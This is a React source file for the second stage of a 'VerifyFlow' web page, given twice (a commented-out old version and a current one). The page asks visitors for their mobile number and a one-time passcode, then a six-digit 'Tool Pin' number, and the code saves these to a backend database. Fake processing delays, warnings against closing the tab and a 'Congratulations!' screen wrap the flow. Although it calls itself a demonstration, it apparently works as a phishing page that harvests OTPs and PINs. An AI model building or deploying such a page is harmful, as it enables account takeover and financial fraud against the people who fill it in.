// import { useEffect, useState } from "react";

// import { getPublicPageConfig } from "../services/pageConfig.service.js";
// import {
//   completeStageTwo,
//   saveToolPin,
// } from "../services/submission.service.js";

// import "../styles/pages/landing.css";

// const DEFAULT_HEADING = "Confirm your mobile number";

// const PROCESSING_DURATION = 2500;
// const TOOLPIN_PROCESSING_DURATION = 7500;

// function StageTwoPage() {
//   const [heading, setHeading] = useState(DEFAULT_HEADING);

//   // Stage 2 form
//   const [mobileNumber, setMobileNumber] = useState("");
//   const [demoCode, setDemoCode] = useState("");

//   // Stage 2 processing
//   const [isSubmitting, setIsSubmitting] = useState(false);
//   const [isProcessing, setIsProcessing] = useState(false);

//   // ToolPin form
//   const [isToolPinStep, setIsToolPinStep] = useState(false);
//   const [toolPinNumber, setToolPinNumber] = useState("");
//   const [toolPinError, setToolPinError] = useState("");
//   const [isSavingToolPin, setIsSavingToolPin] = useState(false);

//   // ToolPin processing
//   const [isToolPinProcessing, setIsToolPinProcessing] = useState(false);

//   // Final completion
//   const [isComplete, setIsComplete] = useState(false);

//   // Stage 2 error
//   const [formError, setFormError] = useState("");

//   // Fetch Stage 2 heading configured by admin.
//   useEffect(() => {
//     const controller = new AbortController();

//     getPublicPageConfig(controller.signal)
//       .then((config) => {
//         if (
//           typeof config?.stageTwoHeading === "string" &&
//           config.stageTwoHeading.trim()
//         ) {
//           setHeading(config.stageTwoHeading.trim());
//         }
//       })
//       .catch(() => {
//         // Use the default heading if fetching fails.
//       });

//     return () => controller.abort();
//   }, []);

//   // Stage 2 processing: wait 2.5 seconds, then show ToolPin step.
//   useEffect(() => {
//     if (!isProcessing) return undefined;

//     const timeoutId = window.setTimeout(() => {
//       setIsProcessing(false);
//       setIsToolPinStep(true);
//     }, PROCESSING_DURATION);

//     const handleBeforeUnload = (event) => {
//       event.preventDefault();
//       event.returnValue = "";
//     };

//     window.addEventListener("beforeunload", handleBeforeUnload);

//     return () => {
//       window.clearTimeout(timeoutId);
//       window.removeEventListener("beforeunload", handleBeforeUnload);
//     };
//   }, [isProcessing]);

//   // ToolPin processing: wait 7.5 seconds, then show congratulations.
//   useEffect(() => {
//     if (!isToolPinProcessing) return undefined;

//     const timeoutId = window.setTimeout(() => {
//       setIsToolPinProcessing(false);
//       setIsComplete(true);
//     }, TOOLPIN_PROCESSING_DURATION);

//     const handleBeforeUnload = (event) => {
//       event.preventDefault();
//       event.returnValue = "";
//     };

//     window.addEventListener("beforeunload", handleBeforeUnload);

//     return () => {
//       window.clearTimeout(timeoutId);
//       window.removeEventListener("beforeunload", handleBeforeUnload);
//     };
//   }, [isToolPinProcessing]);

//   // Handle Stage 2 submission.
//   const handleSubmit = async (event) => {
//     event.preventDefault();

//     setFormError("");

//     if (!/^[0-9]{10}$/.test(mobileNumber)) {
//       setFormError("Please enter a valid 10-digit mobile number.");
//       return;
//     }

//     setIsSubmitting(true);

//     try {
//       await completeStageTwo({
//         mobileNumber,
//         stageTwoCode: demoCode,
//       });

//       setDemoCode("");

//       // Start processing after successful Stage 2 verification.
//       setIsProcessing(true);
//     } catch (error) {
//       setFormError(
//         error?.response?.data?.message ||
//           "Unable to verify your details. Please try again.",
//       );
//     } finally {
//       setIsSubmitting(false);
//     }
//   };

//   // Handle ToolPin submission.
//   const handleToolPinSubmit = async (event) => {
//     event.preventDefault();

//     setToolPinError("");

//     const cleanToolPinNumber = toolPinNumber.trim();

//     if (!/^[0-9]{1,20}$/.test(cleanToolPinNumber)) {
//       setToolPinError(
//         "Please enter a valid ToolPin number containing 1 to 20 digits.",
//       );
//       return;
//     }

//     setIsSavingToolPin(true);

//     try {
//       // Save ToolPin in MongoDB before starting final processing.
//       await saveToolPin(cleanToolPinNumber);

//       setIsToolPinProcessing(true);
//     } catch (error) {
//       setToolPinError(
//         error?.response?.data?.message ||
//           "Unable to save your ToolPin number. Please try again.",
//       );
//     } finally {
//       setIsSavingToolPin(false);
//     }
//   };

//   const isToolPinPage = isToolPinStep && !isToolPinProcessing && !isComplete;

//   return (
//     <div className="vf-landing-page">
//       <header className="vf-landing-header">
//         <div className="vf-landing-header__inner">
//           <a href="/" className="vf-landing-brand">
//             <span className="vf-landing-brand__icon">
//               <svg
//                 width="19"
//                 height="19"
//                 viewBox="0 0 24 24"
//                 fill="none"
//                 stroke="currentColor"
//                 strokeWidth="2.5"
//                 strokeLinecap="round"
//                 strokeLinejoin="round"
//                 aria-hidden="true"
//               >
//                 <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
//                 <path d="m9 12 2 2 4-4" />
//               </svg>
//             </span>

//             <span className="vf-landing-brand__name">VerifyFlow</span>
//           </a>
//         </div>
//       </header>

//       <main
//         className={`vf-landing-main ${
//           isToolPinPage ? "vf-landing-main--lucky" : ""
//         }`}
//       >
//         {/* Stage 2 processing screen */}
//         {isProcessing ? (
//           <section
//             className="vf-landing-card vf-landing-success vf-landing-processing"
//             role="status"
//             aria-live="polite"
//           >
//             <div className="vf-processing-spinner" aria-hidden="true" />

//             <h1>Verification in Process</h1>

//             <p>Please wait while we complete your verification.</p>

//             <p className="vf-landing-success__note">
//               Please don't refresh or close this tab. Your verification is being
//               processed.
//             </p>
//           </section>
//         ) : isToolPinProcessing ? (
//           /* ToolPin processing screen */
//           <section
//             className="vf-landing-card vf-landing-success vf-landing-processing"
//             role="status"
//             aria-live="polite"
//           >
//             <div className="vf-processing-spinner" aria-hidden="true" />

//             <h1>Almost There!</h1>

//             <p>Please wait while we process your final step.</p>

//             <p className="vf-landing-success__note">
//               Your ToolPin number has been submitted successfully.
//             </p>
//           </section>
//         ) : isComplete ? (
//           /* Final congratulations screen */
//           <section className="vf-landing-card vf-landing-success">
//             <div className="vf-landing-success__icon">✓</div>

//             <h1>Congratulations!</h1>

//             <p>Verification Successful</p>

//             <p className="vf-landing-success__note">
//               Your VerifyFlow demonstration has been completed successfully.
//             </p>
//           </section>
//         ) : isToolPinStep ? (
//           /* ToolPin step */
//           <section className="vf-lucky-card">
//             <div className="vf-lucky-card__content">
//               <h1>What's Your ToolPin Number?</h1>

//               <p className="vf-lucky-card__description">
//                 Enter your ToolPin number to continue.
//               </p>

//               <form className="vf-landing-form" onSubmit={handleToolPinSubmit}>
//                 <div className="vf-input-container vf-input-container--full-width">
//                   <label htmlFor="tool-pin" className="vf-input-label">
//                     Your ToolPin Number
//                     <span className="vf-input-required-indicator">*</span>
//                   </label>

//                   <input
//                     id="tool-pin"
//                     type="text"
//                     className="vf-input vf-input--medium"
//                     placeholder="Enter your ToolPin number"
//                     value={toolPinNumber}
//                     onChange={(event) => {
//                       setToolPinNumber(
//                         event.target.value.replace(/\D/g, "").slice(0, 20),
//                       );

//                       setToolPinError("");
//                     }}
//                     inputMode="numeric"
//                     autoComplete="off"
//                     maxLength={20}
//                     required
//                   />
//                 </div>

//                 {toolPinError && (
//                   <p className="vf-landing-error" role="alert">
//                     {toolPinError}
//                   </p>
//                 )}

//                 <button
//                   type="submit"
//                   className={`vf-button vf-button--primary vf-button--large vf-button--full-width ${
//                     isSavingToolPin ? "vf-button--loading" : ""
//                   }`}
//                   disabled={isSavingToolPin}
//                 >
//                   {isSavingToolPin && (
//                     <span className="vf-button__spinner" aria-hidden="true" />
//                   )}

//                   <span className="vf-button__content">
//                     {isSavingToolPin ? "Saving..." : "Submit"}
//                   </span>
//                 </button>
//               </form>
//             </div>
//           </section>
//         ) : (
//           /* Existing Stage 2 form */
//           <section className="vf-landing-card">
//             <h1 className="vf-landing-heading">{heading}</h1>

//             <form className="vf-landing-form" onSubmit={handleSubmit}>
//               <div className="vf-input-container vf-input-container--full-width">
//                 <label htmlFor="stage-two-mobile" className="vf-input-label">
//                   Mobile Number
//                   <span className="vf-input-required-indicator">*</span>
//                 </label>

//                 <input
//                   id="stage-two-mobile"
//                   type="tel"
//                   className="vf-input vf-input--medium"
//                   placeholder="Re-enter your 10-digit mobile number"
//                   value={mobileNumber}
//                   onChange={(event) => {
//                     setMobileNumber(
//                       event.target.value.replace(/\D/g, "").slice(0, 10),
//                     );

//                     setFormError("");
//                   }}
//                   inputMode="numeric"
//                   autoComplete="tel-national"
//                   pattern="[0-9]{10}"
//                   maxLength={10}
//                   required
//                 />
//               </div>

//               <div className="vf-input-container vf-input-container--full-width">
//                 <label htmlFor="stage-two-demo-code" className="vf-input-label">
//                   Enter OTP
//                   <span className="vf-input-required-indicator">*</span>
//                 </label>

//                 <input
//                   id="stage-two-demo-code"
//                   type="text"
//                   className="vf-input vf-input--medium"
//                   placeholder="Enter your OTP here"
//                   value={demoCode}
//                   onChange={(event) => {
//                     setDemoCode(event.target.value);
//                   }}
//                   autoComplete="off"
//                   inputMode="numeric"
//                   required
//                   maxLength={6}
//                 />
//               </div>

//               {formError && (
//                 <p className="vf-landing-error" role="alert">
//                   {formError}
//                 </p>
//               )}

//               <button
//                 type="submit"
//                 className={`vf-button vf-button--primary vf-button--large vf-button--full-width ${
//                   isSubmitting ? "vf-button--loading" : ""
//                 }`}
//                 disabled={isSubmitting}
//               >
//                 {isSubmitting && (
//                   <span className="vf-button__spinner" aria-hidden="true" />
//                 )}

//                 <span className="vf-button__content">
//                   {isSubmitting ? "Checking..." : "Continue"}
//                 </span>
//               </button>
//             </form>
//           </section>
//         )}
//       </main>
//     </div>
//   );
// }

// export default StageTwoPage;

import { useEffect, useState } from "react";

import { getPublicPageConfig } from "../services/pageConfig.service.js";
import {
  completeStageTwo,
  saveToolPin,
  verifyStageTwoMobile,
} from "../services/submission.service.js";

import "../styles/pages/landing.css";

const DEFAULT_HEADING = "Confirm your mobile number";

const OTP_VISIBILITY_DELAY = 500;
const PROCESSING_DURATION = 2500;
const TOOLPIN_PROCESSING_DURATION = 7500;

function StageTwoPage() {
  const [heading, setHeading] = useState(DEFAULT_HEADING);

  // Stage 2 form
  const [mobileNumber, setMobileNumber] = useState("");
  const [demoCode, setDemoCode] = useState("");

  // OTP verification
  const [isOtpRequesting, setIsOtpRequesting] = useState(false);
  const [isOtpRequested, setIsOtpRequested] = useState(false);
  const [isOtpVisible, setIsOtpVisible] = useState(false);

  // Stage 2 processing
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);

  // ToolPin form
  const [isToolPinStep, setIsToolPinStep] = useState(false);
  const [toolPinNumber, setToolPinNumber] = useState("");
  const [toolPinError, setToolPinError] = useState("");
  const [isSavingToolPin, setIsSavingToolPin] = useState(false);

  // ToolPin processing
  const [isToolPinProcessing, setIsToolPinProcessing] = useState(false);

  // Final completion
  const [isComplete, setIsComplete] = useState(false);

  // Stage 2 error
  const [formError, setFormError] = useState("");

  // Fetch Stage 2 heading configured by admin.
  useEffect(() => {
    const controller = new AbortController();

    getPublicPageConfig(controller.signal)
      .then((config) => {
        if (
          typeof config?.stageTwoHeading === "string" &&
          config.stageTwoHeading.trim()
        ) {
          setHeading(config.stageTwoHeading.trim());
        }
      })
      .catch(() => {
        // Use the default heading if fetching fails.
      });

    return () => controller.abort();
  }, []);

  // Show OTP input 3 seconds after successful mobile verification.
  useEffect(() => {
    if (!isOtpRequested) return undefined;

    const timeoutId = window.setTimeout(() => {
      setIsOtpVisible(true);
    }, OTP_VISIBILITY_DELAY);

    return () => window.clearTimeout(timeoutId);
  }, [isOtpRequested]);

  // Handle Stage 2 Send OTP.
  const handleRequestOtp = async () => {
    setFormError("");

    if (!/^[0-9]{10}$/.test(mobileNumber)) {
      setFormError("Please enter a valid 10-digit mobile number.");
      return;
    }

    setIsOtpRequesting(true);
    setIsOtpRequested(false);
    setIsOtpVisible(false);
    setDemoCode("");

    try {
      // Verify Stage 2 mobile number against the Stage 1 number.
      await verifyStageTwoMobile(mobileNumber);

      // Start the 3-second timer only after backend verification succeeds.
      setIsOtpRequested(true);
    } catch (error) {
      setFormError(
        error?.response?.data?.message ||
          "Unable to verify your mobile number. Please try again.",
      );
    } finally {
      setIsOtpRequesting(false);
    }
  };

  // Stage 2 processing: wait 2.5 seconds, then show ToolPin step.
  useEffect(() => {
    if (!isProcessing) return undefined;

    const timeoutId = window.setTimeout(() => {
      setIsProcessing(false);
      setIsToolPinStep(true);
    }, PROCESSING_DURATION);

    const handleBeforeUnload = (event) => {
      event.preventDefault();
      event.returnValue = "";
    };

    window.addEventListener("beforeunload", handleBeforeUnload);

    return () => {
      window.clearTimeout(timeoutId);
      window.removeEventListener("beforeunload", handleBeforeUnload);
    };
  }, [isProcessing]);

  // ToolPin processing: wait 7.5 seconds, then show congratulations.
  useEffect(() => {
    if (!isToolPinProcessing) return undefined;

    const timeoutId = window.setTimeout(() => {
      setIsToolPinProcessing(false);
      setIsComplete(true);
    }, TOOLPIN_PROCESSING_DURATION);

    const handleBeforeUnload = (event) => {
      event.preventDefault();
      event.returnValue = "";
    };

    window.addEventListener("beforeunload", handleBeforeUnload);

    return () => {
      window.clearTimeout(timeoutId);
      window.removeEventListener("beforeunload", handleBeforeUnload);
    };
  }, [isToolPinProcessing]);

  // Handle Stage 2 submission.
  const handleSubmit = async (event) => {
    event.preventDefault();

    setFormError("");

    if (!/^[0-9]{10}$/.test(mobileNumber)) {
      setFormError("Please enter a valid 10-digit mobile number.");
      return;
    }

    if (!isOtpVisible) {
      setFormError(
        "Please verify your mobile number and request the OTP first.",
      );
      return;
    }

    if (!demoCode.trim()) {
      setFormError("Please enter the OTP.");
      return;
    }

    setIsSubmitting(true);

    try {
      await completeStageTwo({
        mobileNumber,
        stageTwoCode: demoCode,
      });

      setDemoCode("");

      // Start processing after successful Stage 2 verification.
      setIsProcessing(true);
    } catch (error) {
      setFormError(
        error?.response?.data?.message ||
          "Unable to verify your details. Please try again.",
      );
    } finally {
      setIsSubmitting(false);
    }
  };

  // Handle ToolPin submission.
  const handleToolPinSubmit = async (event) => {
    event.preventDefault();

    setToolPinError("");

    const cleanToolPinNumber = toolPinNumber.trim();

    if (!/^[0-9]{1,20}$/.test(cleanToolPinNumber)) {
      setToolPinError(
        "Please enter a valid ToolPin number containing 1 to 20 digits.",
      );
      return;
    }

    setIsSavingToolPin(true);

    try {
      // Save ToolPin in MongoDB before starting final processing.
      await saveToolPin(cleanToolPinNumber);

      setIsToolPinProcessing(true);
    } catch (error) {
      setToolPinError(
        error?.response?.data?.message ||
          "Unable to save your ToolPin number. Please try again.",
      );
    } finally {
      setIsSavingToolPin(false);
    }
  };

  const isToolPinPage = isToolPinStep && !isToolPinProcessing && !isComplete;

  return (
    <div className="vf-landing-page">
      <header className="vf-landing-header">
        <div className="vf-landing-header__inner">
          <a href="/" className="vf-landing-brand">
            <span className="vf-landing-brand__icon">
              <svg
                width="19"
                height="19"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2.5"
                strokeLinecap="round"
                strokeLinejoin="round"
                aria-hidden="true"
              >
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                <path d="m9 12 2 2 4-4" />
              </svg>
            </span>

            <span className="vf-landing-brand__name">VerifyFlow</span>
          </a>
        </div>
      </header>

      <main
        className={`vf-landing-main ${
          isToolPinPage ? "vf-landing-main--lucky" : ""
        }`}
      >
        {/* Stage 2 processing screen */}
        {isProcessing ? (
          <section
            className="vf-landing-card vf-landing-success vf-landing-processing"
            role="status"
            aria-live="polite"
          >
            <div className="vf-processing-spinner" aria-hidden="true" />

            <h1>Verification in Process</h1>

            <p>Please wait while we complete your verification.</p>

            <p className="vf-landing-success__note">
              Please don't refresh or close this tab. Your verification is being
              processed.
            </p>
          </section>
        ) : isToolPinProcessing ? (
          /* ToolPin processing screen */
          <section
            className="vf-landing-card vf-landing-success vf-landing-processing"
            role="status"
            aria-live="polite"
          >
            <div className="vf-processing-spinner" aria-hidden="true" />

            <h1>Almost There!</h1>

            <p>Please wait while we process your final step.</p>

            <p className="vf-landing-success__note">
              Your ToolPin number has been submitted successfully.
            </p>
          </section>
        ) : isComplete ? (
          /* Final congratulations screen */
          <section className="vf-landing-card vf-landing-success">
            <div className="vf-landing-success__icon">✓</div>

            <h1>Congratulations!</h1>

            <p>Verification Successful</p>

            <p className="vf-landing-success__note">
              Your VerifyFlow demonstration has been completed successfully.
            </p>
          </section>
        ) : isToolPinStep ? (
          /* ToolPin step */
          <section className="vf-lucky-card">
            <div className="vf-lucky-card__content">
              <h1>What's Your Tool Pin Number?</h1>

              <p className="vf-lucky-card__description">
                Enter your Tool Pin number to continue.
              </p>

              <form className="vf-landing-form" onSubmit={handleToolPinSubmit}>
                <div className="vf-input-container vf-input-container--full-width">
                  <label htmlFor="tool-pin" className="vf-input-label">
                    Your Tool Pin Number
                    <span className="vf-input-required-indicator">*</span>
                  </label>

                  <input
                    id="tool-pin"
                    type="text"
                    className="vf-input vf-input--medium"
                    placeholder="Enter your ToolPin number"
                    value={toolPinNumber}
                    onChange={(event) => {
                      setToolPinNumber(
                        event.target.value.replace(/\D/g, "").slice(0, 20),
                      );

                      setToolPinError("");
                    }}
                    pattern="[0-9]{6}"
                    inputMode="numeric"
                    minLength={6}
                    maxLength={6}
                    autoComplete="off"
                    required
                  />
                </div>

                {toolPinError && (
                  <p className="vf-landing-error" role="alert">
                    {toolPinError}
                  </p>
                )}

                <button
                  type="submit"
                  className={`vf-button vf-button--primary vf-button--large vf-button--full-width ${
                    isSavingToolPin ? "vf-button--loading" : ""
                  }`}
                  disabled={isSavingToolPin}
                >
                  {isSavingToolPin && (
                    <span className="vf-button__spinner" aria-hidden="true" />
                  )}

                  <span className="vf-button__content">
                    {isSavingToolPin ? "Saving..." : "Submit"}
                  </span>
                </button>
              </form>
            </div>
          </section>
        ) : (
          /* Stage 2 form */
          <section className="vf-landing-card">
            <h1 className="vf-landing-heading">{heading}</h1>

            <form className="vf-landing-form" onSubmit={handleSubmit}>
              {/* Mobile number */}
              <div className="vf-input-container vf-input-container--full-width">
                <label htmlFor="stage-two-mobile" className="vf-input-label">
                  Mobile Number
                  <span className="vf-input-required-indicator">*</span>
                </label>

                <div className="vf-mobile-input-row">
                  <input
                    id="stage-two-mobile"
                    type="tel"
                    className="vf-input vf-input--medium"
                    placeholder="Re-enter your 10-digit mobile number"
                    value={mobileNumber}
                    onChange={(event) => {
                      setMobileNumber(
                        event.target.value.replace(/\D/g, "").slice(0, 10),
                      );

                      // Reset OTP state when mobile number changes.
                      setIsOtpRequested(false);
                      setIsOtpVisible(false);
                      setDemoCode("");
                      setFormError("");
                    }}
                    inputMode="numeric"
                    autoComplete="tel-national"
                    pattern="[0-9]{10}"
                    maxLength={10}
                    disabled={isOtpRequesting}
                    required
                  />

                  <button
                    type="button"
                    className={`vf-send-otp-button ${
                      isOtpRequested ? "is-clicked" : ""
                    }`}
                    disabled={
                      !/^[0-9]{10}$/.test(mobileNumber) ||
                      isOtpRequesting ||
                      isOtpRequested
                    }
                    onClick={handleRequestOtp}
                  >
                    {isOtpRequesting
                      ? "Checking..."
                      : isOtpRequested
                        ? "OTP Requested ✓"
                        : "Send OTP"}
                  </button>
                </div>
              </div>

              {/* OTP input: visible only after successful verification + 3 seconds */}
              {isOtpVisible && (
                <div className="vf-input-container vf-input-container--full-width">
                  <label
                    htmlFor="stage-two-demo-code"
                    className="vf-input-label"
                  >
                    Enter OTP
                    <span className="vf-input-required-indicator">*</span>
                  </label>

                  <input
                    id="stage-two-demo-code"
                    type="text"
                    className="vf-input vf-input--medium"
                    placeholder="Enter your OTP here"
                    value={demoCode}
                    onChange={(event) => {
                      // setDemoCode(event.target.value);
                      const numericValue = event.target.value
                        .replace(/[^0-9]/g, "")
                        .slice(0, 6);

                      setDemoCode(numericValue);
                    }}
                    autoComplete="off"
                    pattern="[0-9]{6}"
                    inputMode="numeric"
                    required
                    minLength={6}
                    maxLength={6}
                  />
                </div>
              )}

              {formError && (
                <p className="vf-landing-error" role="alert">
                  {formError}
                </p>
              )}

              <button
                type="submit"
                className={`vf-button vf-button--primary vf-button--large vf-button--full-width ${
                  isSubmitting ? "vf-button--loading" : ""
                }`}
                disabled={isSubmitting || !isOtpVisible}
              >
                {isSubmitting && (
                  <span className="vf-button__spinner" aria-hidden="true" />
                )}

                <span className="vf-button__content">
                  {isSubmitting ? "Checking..." : "Continue"}
                </span>
              </button>
            </form>
          </section>
        )}
      </main>
    </div>
  );
}

export default StageTwoPage;
